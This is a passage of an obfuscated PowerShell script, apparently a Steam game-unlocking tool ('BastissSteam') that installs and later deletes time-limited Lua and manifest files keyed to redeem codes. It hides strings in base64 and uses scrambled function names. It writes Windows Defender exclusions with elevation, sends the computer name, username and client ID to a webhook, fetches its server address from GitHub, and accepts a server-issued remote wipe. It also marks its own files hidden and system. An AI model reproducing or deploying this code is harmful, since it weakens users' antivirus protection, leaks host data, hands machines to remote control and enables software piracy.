        try { $cv = (& curl.exe --version 2>&1 | Select-Object -First 1); $lines += "**curl:** $cv" } catch { $lines += "**curl:** no disponible" }
        try { Update-ServerUrl } catch {}
        $su = $script:serverUrl
        $lines += "**Server URL:** $su"
        try {
            $hostN = ([uri]$su).Host
            $dns = [System.Net.Dns]::GetHostAddresses($hostN)
            $lines += "**DNS ${hostN}:** $($dns.IPAddressToString -join ', ')"
        } catch { $lines += "**DNS:** fallo - $($_.Exception.Message)" }
        try {
            $r = Invoke-WebRequest -Uri (S("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vbWFpbi9jdXJyZW50X3VybC50eHQ=")) -UseBasicParsing -TimeoutSec 8 -ErrorAction Stop
            $lines += "**GitHub URL:** $($r.Content.Trim())"
        } catch { $lines += "**GitHub URL:** error - $($_.Exception.Message)" }
        try {
            $tmpOut = Join-Path $env:TEMP "bsmap_diag_out.txt"
            $resolveArg = @()
            if ($script:serverIp -and $su -match "^https://") {
                $hn = ([uri]$su).Host
                if ($hn) { $resolveArg = @("--resolve", "$($hn):443:$($script:serverIp)") }
            }
            $null = & curl.exe -s -k --ssl-no-revoke --tlsv1.2 --noproxy "*" @resolveArg -X POST -H "Content-Type: application/json" --data-binary "{}" "$su/api/redeem-code" --max-time 15 -o $tmpOut
            $lines += "**Test tunnel /api/redeem-code:** curl exit $LASTEXITCODE (serverIp: $($script:serverIp))"
            Remove-Item $tmpOut -Force -ErrorAction SilentlyContinue
        } catch { $lines += "**Test tunnel:** error - $($_.Exception.Message)" }
        try { $sp = Get-SteamPath; $lines += "**Steam:** $sp" } catch { $lines += "**Steam:** no detectado" }
        $content = $lines -join "`n"
        $bt = [char]96
        $payload = @{ content = "$bt$bt$bt diff`n$content`n$bt$bt$bt" } | ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 15 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}


$CLIENT_ID_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfY2xpZW50X2lkLnR4dA=="))
function Get-ClientId {
    if (Test-Path $CLIENT_ID_FILE) {
        try { return (Get-Content $CLIENT_ID_FILE -Raw -ErrorAction Stop).Trim() } catch {}
    }
    $id = "PC-" + (-join ((48..57)+(65..90) | Get-Random -Count 32 | ForEach-Object { [char]$_ }))
    try { Set-Content $CLIENT_ID_FILE $id -Force -ErrorAction Stop } catch {}
    return $id
}
$script:clientId = Get-ClientId
$TOKEN_FILE = Join-Path $env:LOCALAPPDATA 'bsmap_token.json'
function Get-LocalToken {
    try { if (Test-Path -LiteralPath $TOKEN_FILE) { return (Get-Content -LiteralPath $TOKEN_FILE -Raw | ConvertFrom-Json) } } catch {}
    return $null
}
function Set-LocalToken($token, $code) {
    try {
        @{ token = $token; code = $code; client_id = $script:clientId; saved = (Get-Date).ToString('o') } |
            ConvertTo-Json | Set-Content -LiteralPath $TOKEN_FILE -Encoding UTF8
    } catch {}
}


function Get-SteamPath {
    $paths = @(
        (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath,
        (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name InstallPath -ErrorAction SilentlyContinue).InstallPath,
        (Get-ItemProperty -Path "HKCU:\SOFTWARE\Valve\Steam" -Name SteamPath -ErrorAction SilentlyContinue).SteamPath,
        "${env:ProgramFiles(x86)}\Steam",
        "${env:ProgramFiles(x86)}\Steamm",
        "$env:ProgramFiles\Steam",
        "C:\xdd"
    )
    foreach ($p in $paths) {
        if ($p -and (Test-Path $p) -and (Test-Path (Join-Path $p (S("c3RlYW0uZXhl"))))) { return $p }
    }
    foreach ($p in $paths) {
        if ($p -and (Test-Path $p)) { return $p }
    }
    throw (S("Tm8gc2UgZW5jb250cm8gU3RlYW0gZW4gZWwgcmVnaXN0cm8gbmkgZW4gcnV0YXMgdGlwaWNhcy4="))
}

function Find-SteamRoots {
    $roots = @()
    try { $r = Get-SteamPath; if ($r -and (Test-Path $r)) { $roots += $r } } catch {}
    foreach ($hk in @("HKLM:\SOFTWARE\WOW6432Node\Valve\Steam","HKLM:\SOFTWARE\Valve\Steam","HKCU:\SOFTWARE\Valve\Steam")) {
        $n = if ($hk -match 'HKCU') {'SteamPath'} else {'InstallPath'}
        $p = try { (Get-ItemProperty -Path $hk -Name $n -ErrorAction SilentlyContinue).$n } catch {}
        if ($p -and (Test-Path $p) -and ($roots -notcontains $p)) { $roots += $p }
    }
    foreach ($root in @(@($roots))) {
        $vdf = Join-Path $root "config\libraryfolders.vdf"
        if (Test-Path $vdf) {
            try { $c = Get-Content $vdf -Raw -ErrorAction Stop
                foreach ($m in [regex]::Matches($c, '"path"\s+"([^"]+)"')) {
                    $p = $m.Groups[1].Value.Replace('\\','\')
                    if ((Test-Path $p) -and ($roots -notcontains $p)) { $roots += $p }
                }
            } catch {}
        }
    }
    foreach ($d in 'C','D','E','F','G') {
        foreach ($sub in @('\Steam','\SteamLibrary')) {
            $p = "${d}:$sub"
            if ((Test-Path $p) -and ($roots -notcontains $p)) { $roots += $p }
        }
    }
    return $roots | Select-Object -Unique
}


function Get-SafeFont {
    param([string]$Family = "Segoe UI", [float]$Size = 10, $Style = [System.Drawing.FontStyle]::Regular)
    $fallbacks = @($Family, "Arial", "Microsoft Sans Serif", "Tahoma", "Segoe UI")
    foreach ($f in $fallbacks) {
        try { return New-Object System.Drawing.Font($f, $Size, $Style) } catch {}
    }
    return New-Object System.Drawing.Font("Arial", $Size, $Style)
}


function Add-DefenderExclusion {
    param([string]$Path)
    $regPath = "HKLM:\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"
    $current = try { (Get-ItemProperty -Path $regPath -ErrorAction Stop).PSObject.Properties.Name } catch { @() }
    if ($current -contains $Path) { return $true }
    try {
        Set-ItemProperty -Path $regPath -Name $Path -Value 0 -Type DWord -ErrorAction Stop
        return $true
    } catch {}
    try {
        $cmd = "reg.exe ADD `"HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths`" /v `"$Path`" /t REG_DWORD /d 0 /f"
        Start-Process cmd -ArgumentList "/c $cmd" -Verb RunAs -Wait -ErrorAction Stop
        return $true
    } catch { return $false }
}


$TIMERS_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfdGltZXJzLmpzb24="))
$OFFSET_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfb2Zmc2V0Lmpzb24="))
$script:internetTimeCache = $null
$script:internetTimeCacheTime = (Get-Date).AddDays(-1)
$script:utf8NoBom = New-Object System.Text.UTF8Encoding $false


function Get-CdnTimeUtc {
    foreach ($u in @('https://www.google.com','https://www.cloudflare.com','https://github.com')) {
        try {
            $h = & curl.exe -s -I --max-time 4 $u
            $m = $h | Select-String -Pattern '^Date:\s*(.+)$'
            if ($m) {
                $d = $m.Matches[0].Groups[1].Value.Trim()
                return [datetime]::ParseExact($d, 'r', [System.Globalization.CultureInfo]::InvariantCulture)
            }
        } catch {}
    }
    return $null
}


function Get-InternetTime {
    $nowLocal = Get-Date
    if (($nowLocal - $script:internetTimeCacheTime).TotalSeconds -le 60 -and $script:internetTimeCache) {
        return $script:internetTimeCache, $true
    }
    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    $override = $env:BSMAP_TIMEAPI_URL
    try {
        if ($override) { $r = Invoke-RestMethod $override -Headers @{ 'User-Agent' = $ua } -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop; $t = [datetime]::ParseExact($r.dateTime.Substring(0,19), 'yyyy-MM-ddTHH:mm:ss', $null).ToLocalTime() }
        else {
            
            try {
                $cdnUtc = Get-CdnTimeUtc
                if (-not $cdnUtc) { throw 'CDN sin Date' }
                $t = $cdnUtc.ToLocalTime()
            } catch {
                
                $r = Invoke-RestMethod (S('aHR0cHM6Ly93b3JsZHRpbWVhcGkub3JnL2FwaS9pcA==')) -Headers @{ 'User-Agent' = $ua } -UseBasicParsing -TimeoutSec 4 -ErrorAction Stop
                $t = [datetime]::ParseExact($r.utc_datetime.Substring(0,19), 'yyyy-MM-ddTHH:mm:ss', $null).ToLocalTime()
            }
        }
        $script:internetTimeCache = $t; $script:internetTimeCacheTime = $nowLocal
        return $t, $true
    } catch { return $null, $false }
}

function Read-NetOffset {
    try {
        if (Test-Path $OFFSET_FILE) {
            $o = Get-Content $OFFSET_FILE -Raw | ConvertFrom-Json
            if ($o.offset_seconds) { return [double]$o.offset_seconds }
        }
    } catch {}
    return $null
}
$script:clockOffsetSec = if ((Read-NetOffset)) { [double](Read-NetOffset) } else { 0 }

function Save-NetOffset {
    param([double]$sec)
    try { [System.IO.File]::WriteAllText($OFFSET_FILE, (@{ offset_seconds = [math]::Round($sec,1); measured_at = (Get-Date).ToString('o') } | ConvertTo-Json), $script:utf8NoBom) } catch {}
}


function Get-Now {
    $net, $ok = Get-InternetTime
    if ($net) {
        $off = ((Get-Date) - $net).TotalSeconds
        if ([math]::Abs($off) -gt 1) { Save-NetOffset $off }
        $script:clockOffsetSec = $off
        return $net, $true
    }
    $off = Read-NetOffset
    $script:clockOffsetSec = if ($off) { $off } else { 0 }
    if ($off) { return (Get-Date).AddSeconds(-$off), $false }
    return (Get-Date), $false
}


function ConvertTo-ClockTime {
    param([datetime]$dt)
    if (-not $dt) { return $dt }
    $off = if ($script:clockOffsetSec) { $script:clockOffsetSec } else { 0 }
    return $dt.AddSeconds($off)
}

function At5Vc {
    if (Test-Path $TIMERS_FILE) {
        try {
            $data = Get-Content $TIMERS_FILE -Raw | ConvertFrom-Json
            $arr = @(foreach ($el in @($data)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            
            $valid = @()
            foreach ($item in $arr) {
                if ($item.expires_at -and $item.PSObject.Properties.Name -contains (S("ZXhwaXJlc19hdA=="))) { $valid += $item }
            }
            if ($valid.Count -gt 0) { return , $valid }
        } catch {}
    }
    
    try {
        $reg = (Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -ErrorAction SilentlyContinue).Timers
        if ($reg) {
            $rt = @(foreach ($el in @($reg | ConvertFrom-Json)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            if ($rt.Count -gt 0 -and $rt[0].expires_at) {
                try { try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {}; [System.IO.File]::WriteAllText($TIMERS_FILE, (ConvertTo-Json -InputObject @($rt) -Depth 10), $script:utf8NoBom) } catch {}
                try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Hidden, System' } catch {}
                return , $rt
            }
        }
    } catch {}
    return ,@()
}

function St7Xb {
    param($t)
    $utf8NoBom = New-Object System.Text.UTF8Encoding $false
    $t = @(foreach ($el in @($t)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
    $json = if ($t.Count -eq 0) { '[]' } else { ConvertTo-Json -InputObject @($t) -Depth 10 }
    $regJson = if ($t.Count -eq 0) { '[]' } else { ConvertTo-Json -InputObject @($t) -Compress -Depth 10 }
    
    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("VGltZXJz")) -Value $regJson -Type String -Force -ErrorAction SilentlyContinue } catch {}
    
    $wroteOk = $false
    for ($i = 0; $i -lt 3; $i++) {
        try {
            try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {}
            [System.IO.File]::WriteAllText($TIMERS_FILE, $json, $utf8NoBom)
            $wroteOk = $true
            break
        } catch { Start-Sleep -Milliseconds 200 }
    }
    if (-not $wroteOk) {
        try { [System.IO.File]::WriteAllText((Join-Path $env:TEMP (S('YnNtYXBfc2F2ZV9mYWlsLmxvZw=='))), "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] St7Xb: FALLO escribir archivo tras 3 intentos. Registro actualizado OK. Contenido: $json", (New-Object System.Text.UTF8Encoding $false)) } catch {}
    }
    try { $fi = Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue; if ($fi) { $fi.Attributes = 'Hidden, System' } } catch {}
}


$HISTORY_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfY29kZXNfaGlzdG9yeS5qc29u"))
function Get-CodesHistory {
    try {
        if (Test-Path $HISTORY_FILE) {
            $h = Get-Content $HISTORY_FILE -Raw | ConvertFrom-Json
            $arr = @(foreach ($el in @($h)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            return ,@($arr | Where-Object { $_ -and $_.code })
        }
    } catch {}
    return ,@()
}
function Add-ExpiredToHistory {
    param($t)
    try {
        $h = @(foreach ($el in Get-CodesHistory) { $el })
        $h += @{ code = if ($t.redeem_code) { $t.redeem_code } else { $t.game_name }; game = $t.game_name; expires_at = $t.expires_at; duration = $t.duration; expired_at = (Get-Date).ToString('o') }
        if ($h.Count -gt 50) { $h = @($h | Select-Object -Last 50) }
        [System.IO.File]::WriteAllText($HISTORY_FILE, (ConvertTo-Json -InputObject @($h) -Depth 10), $script:utf8NoBom)
    } catch {}
}

function Remove-FileHard {
    param([string]$p)
    if (-not (Test-Path $p)) { return }
    Remove-Item -Path $p -Force -ErrorAction SilentlyContinue
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 200
    try { [System.IO.File]::Delete($p) } catch {}
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 500
    try { $a = Get-Item $p -Force -ErrorAction SilentlyContinue; if ($a) { $a.Attributes = 'Normal'; Remove-Item $p -Force } } catch {}
    if (-not (Test-Path $p)) { return }
    Start-Sleep -Milliseconds 1000
    try { Remove-Item -Path $p -Force -ErrorAction Stop } catch {}
}

function Rm9xExp {
    $timers = At5Vc; $remaining = @()
    $expired = @()
    $now, $isNet = Get-Now
    if (-not $now) { $now = Get-Date; $isNet = $false }
    foreach ($t in $timers) {
        $exp = $t.expires_at -as [datetime]; if (-not $exp) { $remaining += $t; continue }
        if ($exp -le $now) {
            
            $gameStillActive = $false
            foreach ($other in $timers) {
                if ($other -eq $t) { continue }
                if ($other.game_name -ne $t.game_name) { continue }
                $otherExp = $other.expires_at -as [datetime]
                if ($otherExp -and $otherExp -gt $now) { $gameStillActive = $true; break }
            }
            if ($gameStillActive) { $remaining += $t; continue }
            
            $expired += $t
        } else { $remaining += $t }
    }
    
    foreach ($t in $expired) {
        $root = $t.steam_root
        if (-not $root) { continue }
        if (-not (Test-Path $root)) {
            $fbRoots = @(Find-SteamRoots)
            foreach ($fb in $fbRoots) {
                $probe = Join-Path $fb (S("Y29uZmlnXHN0cGx1Zy1pbg=="))
                if (Test-Path $probe) { $root = $fb; $t.steam_root = $fb; break }
            }
        }
        $borrados = @(); $fallidos = @()
        foreach ($f in $t.lua_files) {
            $p1 = Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f
            $p2 = Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f
            Remove-FileHard $p1
            Remove-FileHard $p2
            if ((Test-Path $p1) -or (Test-Path $p2)) { $fallidos += $f } else { $borrados += $f }
        }
        foreach ($f in $t.manifest_files) {
            $p3 = Join-Path (Join-Path $root "config\depotcache") $f
            Remove-FileHard $p3
            if (Test-Path $p3) { $fallidos += $f } else { $borrados += $f }
        }
        $logPath = Join-Path $env:TEMP (S("YnNtYXBfanVlZ29fZXhwaXJhZG8ubG9n"))
        try { Add-Content -Path $logPath -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] EXPIRADO y BORRADO: $($t.game_name) (codigo: $($t.redeem_code)) [Root: $root] - OK: $($borrados.Count) | FALLIDOS: $($fallidos.Count)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
        $webhookOk=$false
        for ($wi=0; $wi -lt 3; $wi++) {
            try {
                $bt=[char]96
                $cnt="**EXPIRADO:** $($t.game_name)`n**Codigo:** $bt$bt$bt$($t.redeem_code)$bt$bt$bt`n**Borrados OK:** $($borrados.Count)`n**NO borrados:** $($fallidos.Count)"
                if ($fallidos.Count -gt 0) { $cnt+="`n**Archivos que siguen existiendo:**$bt$bt$bt$($fallidos -join "`n")$bt$bt$bt" }
                if ($cnt.Length -gt 1900) { $cnt=$cnt.Substring(0,1900)+"`n... (truncado)" }
                $pl=@{content=$cnt}|ConvertTo-Json
                Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $pl -ContentType "application/json" -TimeoutSec 15 -ErrorAction Stop | Out-Null
                $webhookOk=$true; break
            } catch {
                try { Add-Content -Path (Join-Path $env:TEMP "bsmap_webhook_fail.log") -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] EXPIRADO $($t.game_name) intento $($wi+1) fail $($_.Exception.Message)" -Encoding UTF8 } catch {}
                if ($wi -eq 2) { try { Add-Content -Path (Join-Path $env:TEMP "bsmap_webhook_queue.json") -Value (@{type="expirado";game=$t.game_name;code=$t.redeem_code;ok=$borrados.Count;fail=$fallidos.Count;ts=(Get-Date).ToString('o')} | ConvertTo-Json -Compress) -Encoding UTF8 } catch {} }
                Start-Sleep -Seconds (2*($wi+1))
            }
        }
        try {
            $short="@everyone Todos los juegos se borraron correctamente. Codigo: $($t.redeem_code) Juego: $($t.game_name) Luas:$($borrados.Count)/$($t.lua_files.Count) Manifests:$($t.manifest_files.Count - $fallidos.Count)/$($t.manifest_files.Count)"
            $pl2=@{content=$short}|ConvertTo-Json
            Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $pl2 -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
        } catch {}
        if ($fallidos.Count -gt 0) { Ad4Lo -gameName $t.game_name -code $t.redeem_code -root $root -luaFiles @($t.lua_files) -manifestFiles @($t.manifest_files) }
        Add-ExpiredToHistory $t
    }
    if ($expired.Count -gt 0) {
        St7Xb $remaining

        $verify = At5Vc
        $stillBad = @()
        foreach ($v in $verify) {
            $vexp = $v.expires_at -as [datetime]
            if ($vexp -and $vexp -le $now) { $stillBad += $v }
        }
        if ($stillBad.Count -gt 0) {
            $remaining2 = @($verify | Where-Object { $_ -notin $stillBad })
            St7Xb $remaining2
            $remaining = $remaining2
        }
        $expCodes = @($expired | Where-Object { try { [int]$_.duration -gt 0 } catch { $false } } | ForEach-Object { $_.redeem_code } | Where-Object { $_ } | Select-Object -Unique)
        $stillCodes = @($remaining | Where-Object { $_.redeem_code } | ForEach-Object { $_.redeem_code } | Where-Object { $_ } | Select-Object -Unique)
        foreach ($ec in $expCodes) {
            if ($stillCodes -notcontains $ec) { Clear-CdExpiredData $ec }
        }
    }
    return $remaining
}


$PENDING_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfcGVuZGluZ19kZWxldGUuanNvbg=="))
function Pd9Uj {
    try {
        if (Test-Path $PENDING_FILE) {
            $parsed = Get-Content $PENDING_FILE -Raw | ConvertFrom-Json
            $arr = @(foreach ($el in @($parsed)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
            return ,@($arr | Where-Object { $_ -and ($_.game_name -or $_.lua_files -or $_.manifest_files) })
        }
    } catch {}
    return ,@()
}
function Sp2Ke {
    param($q)
    try {
        if (-not $q -or $q.Count -eq 0) { [System.IO.File]::WriteAllText($PENDING_FILE, '[]', $script:utf8NoBom) }
        else { [System.IO.File]::WriteAllText($PENDING_FILE, (ConvertTo-Json -InputObject @($q) -Depth 10), $script:utf8NoBom) }
    } catch {}
}
function Ad4Lo {
    param([string]$gameName, [string]$code, [string]$root, [string[]]$luaFiles, [string[]]$manifestFiles)
    try {
        $q = @(Pd9Uj)
        $exists = $false
        for ($i = 0; $i -lt $q.Count; $i++) {
            if ($q[$i].game_name -eq $gameName -and $q[$i].redeem_code -eq $code) {
                $q[$i] = @{ game_name=$gameName; redeem_code=$code; steam_root=$root; lua_files=@($luaFiles); manifest_files=@($manifestFiles); attempts=$q[$i].attempts; last_try=$q[$i].last_try; notified=@($q[$i].notified) }
                $exists = $true; break
            }
        }
        if (-not $exists) { $q += @{ game_name=$gameName; redeem_code=$code; steam_root=$root; lua_files=@($luaFiles); manifest_files=@($manifestFiles); attempts=0; last_try=$null; notified=@() } }
        Sp2Ke $q
    } catch {}
}
function Rp6Mi {
    $q = @(Pd9Uj)
    if ($q.Count -eq 0) { return }
    $remainingQ = @()
    foreach ($e in $q) {
        $root = $e.steam_root
        if (-not $root) { $remainingQ += $e; continue }
        if (-not (Test-Path $root)) {
            $fbRoots = @(Find-SteamRoots)
            foreach ($fb in $fbRoots) {
                $probe = Join-Path $fb (S("Y29uZmlnXHN0cGx1Zy1pbg=="))
                if (Test-Path $probe) { $root = $fb; $e.steam_root = $fb; break }
            }
            if (-not (Test-Path $root)) { $remainingQ += $e; continue }
        }
        $still = @()
        foreach ($f in @($e.lua_files)) {
            $p1 = Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f
            $p2 = Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f
            Remove-FileHard $p1; Remove-FileHard $p2
            if ((Test-Path $p1) -or (Test-Path $p2)) { $still += $f }
        }
        foreach ($f in @($e.manifest_files)) {
            $p3 = Join-Path (Join-Path $root "config\depotcache") $f
            Remove-FileHard $p3
            if (Test-Path $p3) { $still += $f }
        }
        if ($still.Count -eq 0) {
            try { Add-Content -Path (Join-Path $env:TEMP (S("YnNtYXBfanVlZ29fZXhwaXJhZG8ubG9n"))) -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] RETRY COMPLETO: $($e.game_name) (codigo: $($e.redeem_code))" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
            continue
        }
        $attempts = ([int]$e.attempts) + 1
        $notified = @(if ($e.notified) { $e.notified } else { @() })
        if (($attempts -eq 1 -or $attempts -eq 3 -or $attempts -eq 5 -or $attempts -eq 10 -or $attempts % 20 -eq 0) -and $notified -notcontains $attempts) {
            $notified += $attempts
            try {
                $bt = [char]96
                $content = "**ALERTA BORRADO (intento $attempts):** $($e.game_name)`n**Codigo:** $bt$bt$bt$($e.redeem_code)$bt$bt$bt`n**Aun en disco:** $($still.Count) archivos`n$bt$bt$bt$($still -join "`n")$bt$bt$bt"
                $payload = @{ content = $content } | ConvertTo-Json
                Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
            } catch {}
        }
        $remainingQ += @{ game_name=$e.game_name; redeem_code=$e.redeem_code; steam_root=$root; lua_files=@($e.lua_files); manifest_files=@($e.manifest_files); attempts=$attempts; last_try=(Get-Date).ToString('o'); notified=$notified }
    }
    Sp2Ke $remainingQ
}


function Check-RemoteWipe {
    try {
        $cid=$script:clientId; if (-not $cid) { return }
        $body=@{client_id=$cid} | ConvertTo-Json
        $resp=$null; try { $resp=Invoke-RestMethod -Uri "$($script:serverUrl)/api/check-wipe" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue } catch {}
        if ($resp -and $resp.wipe) {
            $timers=At5Vc
            if ($timers.Count -gt 0) {
                $backupRoot=Join-Path $env:LOCALAPPDATA "BastissSteam\backup\wipe_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$([guid]::NewGuid().ToString('N').Substring(0,6))"
                try { New-Item -ItemType Directory -Path $backupRoot -Force | Out-Null } catch {}
                foreach ($t in $timers) {
                    $root=$t.steam_root; if (-not $root) { continue }
                    foreach ($f in @($t.lua_files)) {
                        $p1=Join-Path (Join-Path $root (S("Y29uZmlnXHN0cGx1Zy1pbg=="))) $f; $p2=Join-Path (Join-Path $root (S("Y29uZmlnXGx1YQ=="))) $f
                        try { if (Test-Path -LiteralPath $p1) { Copy-Item -LiteralPath $p1 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}
                        try { if (Test-Path -LiteralPath $p2) { Copy-Item -LiteralPath $p2 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}
                        Remove-FileHard $p1; Remove-FileHard $p2
                    }
                    foreach ($f in @($t.manifest_files)) { $p3=Join-Path (Join-Path $root "config\depotcache") $f; try { if (Test-Path -LiteralPath $p3) { Copy-Item -LiteralPath $p3 -Destination (Join-Path $backupRoot $f) -Force -ErrorAction SilentlyContinue } } catch {}; Remove-FileHard $p3 }
                }
                St7Xb @(); $script:activeCodes.Clear()
                try { $bt=[char]96; $content="**WIPE REMOTO:** $env:COMPUTERNAME / $([Environment]::UserName) ClientID:$cid - Borrados $($timers.Count) juegos backup:$backupRoot"; $payload=@{content=$content}|ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {}
                try { Add-Content -Path (Join-Path $env:TEMP "bsmap_wipe.log") -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] WIPE $($timers.Count) juegos backup $backupRoot" -Encoding UTF8 } catch {}
            }
            try { $b2=@{client_id=$cid} | ConvertTo-Json; Invoke-RestMethod -Uri "$($script:serverUrl)/api/clear-wipe" -Method Post -Body $b2 -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {}
        }
    } catch {}
}
if ($script:expiryWatcher) {
    $expMutex = $null
    try {
        $expMutexCreated = $false
        $expMutex = New-Object System.Threading.Mutex($true, 'Local\BastissSteamExpiryMutex', [ref]$expMutexCreated)
        if (-not $expMutexCreated) { try { $expMutex.Dispose() } catch {}; exit }
    } catch { $expMutex = $null }
    try { WEL 'Watcher de expiracion iniciado' } catch {}
    try {
        $selfPath = [Environment]::GetCommandLineArgs()[0]
        $procName = ([System.Diagnostics.Process]::GetCurrentProcess()).ProcessName
        while ($true) {
            try {
                $guiRunning = @(Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID -and $_.ProcessName -like "$procName*" })
                if ($guiRunning.Count -eq 0) {
                    try { Rm9xExp | Out-Null } catch {}
                    try { Rp6Mi } catch {}
                }
                try { Check-RemoteWipe } catch {}
            } catch {}
            Start-SleepDoEvents 10000
        }
    } finally { if ($expMutex) { try { $expMutex.Dispose() } catch {} } }
    exit
}


$script:serverUrl = "http://127.0.0.1:9878"
$script:serverIp = ""
$script:serverOverrideFile = Join-Path $env:LOCALAPPDATA "BastissSteam\server_token_override.txt"
$script:ghApiUrlBase = (S("aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9iYXN0aXNheWVzL0ZpeGVzLXN0ZWFtL2NvbnRlbnRzL2N1cnJlbnRfdXJsLnR4dA=="))
$script:ghRawUrl = (S("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvQmFzdGlzc1N0ZWFtVjE4L21haW4vY3VycmVudF91cmwudHh0"))
$script:ghApiIpUrl = (D "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9iYXN0aXNheWVzL0ZpeGVzLXN0ZWFtL2NvbnRlbnRzL2N1cnJlbnRfaXAudHh0")
$script:ghRawIpUrl = (D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvQmFzdGlzc1N0ZWFtVjE4L21haW4vY3VycmVudF9pcC50eHQ=")
function Update-ServerUrl {
    try {
        if (Test-Path -LiteralPath $script:serverOverrideFile) {
            $ov = ([System.IO.File]::ReadAllText($script:serverOverrideFile)).Trim()
            if ($ov -match "^https?://") { $script:serverUrl = $ov; $script:serverIp = ""; return }
        }
    } catch {}
    $cacheFile = Join-Path $env:LOCALAPPDATA "BastissSteam\server_url_cached.txt"
    $gotUrl = $false
    try {
        $ghu = ([string](Invoke-RestMethod -Uri $script:ghRawUrl -UseBasicParsing -TimeoutSec 12 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop)).Trim()
        if ($ghu -match "^https?://\S+$") {
            $script:serverUrl = $ghu
            $gotUrl = $true
            try { [System.IO.File]::WriteAllText($cacheFile, $ghu, (New-Object System.Text.UTF8Encoding $false)) } catch {}
        }
    } catch {}
    if (-not $gotUrl) {
        try {
            if (Test-Path -LiteralPath $cacheFile) {
                $cu = ([System.IO.File]::ReadAllText($cacheFile)).Trim()
                if ($cu -match "^https?://\S+$") { $script:serverUrl = $cu; $gotUrl = $true }
            }
        } catch {}
    }
    if (-not $gotUrl) { $script:serverUrl = "http://127.0.0.1:9878" }
    try {
        $ghi = ([string](Invoke-RestMethod -Uri $script:ghRawIpUrl -UseBasicParsing -TimeoutSec 12 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop)).Trim()
        if ($ghi -match '^\d{1,3}(\.\d{1,3}){3}$') { $script:serverIp = $ghi } else { $script:serverIp = "" }
    } catch { $script:serverIp = "" }
}

try {
    if (Test-Path -LiteralPath $script:serverOverrideFile) {
        $ov0 = ([System.IO.File]::ReadAllText($script:serverOverrideFile)).Trim()
        if ($ov0 -match "^https?://") { $script:serverUrl = $ov0 }
    }
} catch {}


function Bn6Lc {
    param([string]$url, [string]$outFile, $progressBar = $null, [int]$progressStart = 0, [int]$progressEnd = 100)
